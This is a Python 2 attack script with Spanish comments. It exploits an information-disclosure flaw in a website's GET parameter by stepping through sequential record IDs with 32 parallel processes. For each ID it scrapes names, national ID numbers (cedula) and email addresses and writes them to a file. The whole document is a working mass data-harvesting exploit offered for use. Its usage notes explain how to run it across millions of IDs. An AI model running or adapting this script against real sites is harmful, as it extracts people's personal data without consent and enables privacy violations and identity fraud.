#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Autor: @kr1shn4murt1
# Fecha: Febreo 12 - 2014
# Proposito: Este script es una mejora, se anhadio la funcionalidad
# de multiproceso para explotar una vulnerabilidad de information disclosure
# en una web en un parametro get, automatiza la tarea de visitar miles de urls
# y haciendo uso de multiproceso reduce drasticamente el tiempo requerido 
# para extraer todos los datos de la web objetivo.

"""
el promedio de extraccion de datos es de 92 a 128 segundos por cada mil 
registros Se guardan en memoria esos mil y se va escribiendo a un archivo,
por ahora para buen rendimiento se debe llamar desde línea de comandos asi:
FOR /L %i IN (20000000,1000,20005000) DO (extraccion.py %i)
Los valores del primer paréntesis son numero inicial, salto, numero final 
pueden manipular esos valores excepto el salto dejenlo en mil.
La linea 77 del script:  -- pool = Pool(processes= 32) define el numero 
de procesos paralelos a ejecutar, se puede aumentar o disminuir de acuerdo
al hardware de la maquina desde donde se ejecuta
"""

from multiprocessing import Pool
import mechanize
import BeautifulSoup
import sys

def recolectar(numeroDato):  
    try:

        navegador= mechanize.Browser()

        url= 'https://vulnerable.com/index.php?id='+str(numeroDato)+'&notif=mostrar'
        
        navegador.open(url,timeout= 1.0)
        
        fuente= navegador.response().read()

        webParseada= BeautifulSoup.BeautifulSoup(fuente)
 
        nombre= webParseada.findAll(attrs={"class" : "mensaje"})[13].getText()

        apellidos= webParseada.findAll(attrs={"class" : "mensaje"})[14].getText()

        cedula= webParseada.findAll(attrs={"class" : "mensaje"})[12].getText()

        correo= webParseada.findAll(attrs={"class" : "mensaje"})[17].getText()

        datos= 'Numero de Dato: '+ str(numeroDato) + '\nNombre: ' + str(nombre) + '\nApellidos: '+ str(apellidos) + '\nCedula: '+ str(cedula) + '\nCorreo: '+ str(correo)+'\n'+'************************************\n'
        datos= datos.encode('ASCII', 'ignore')
        
        return datos

    except: 
        pass

# numero de dato inicial, se toma como parametro desde cmd
numeroInicial= int(sys.argv[1])

# numero de dato final, se extraen cada 1000 datos 
#y se escribe a archivo de output
numeroFinal= numeroInicial+1000+1

result_list = []
def log_result(result):
    if result != None:
        result_list.append(result)
    else:
        result_list.append('Problema con dato\n')


if __name__ == '__main__':

    #el numero 32 son los procesos paralelos a ejecutar, este
    # valor se puede incrementar o disminuir de acuerdo
    # al hardware de la maquina desde donde se ejecuta
    pool = Pool(processes= 32)
    for numeroDato in xrange(numeroInicial,numeroFinal+1):
        pool.apply_async(recolectar, args= (numeroDato, ), callback = log_result)
    pool.close()
    pool.join()
    #print(result_list)
    outfile = open('extracciondatos.txt', 'a')
    for line in result_list:
        outfile.write(str(line))
        #outfile.write(str(result_list))
    outfile.close()

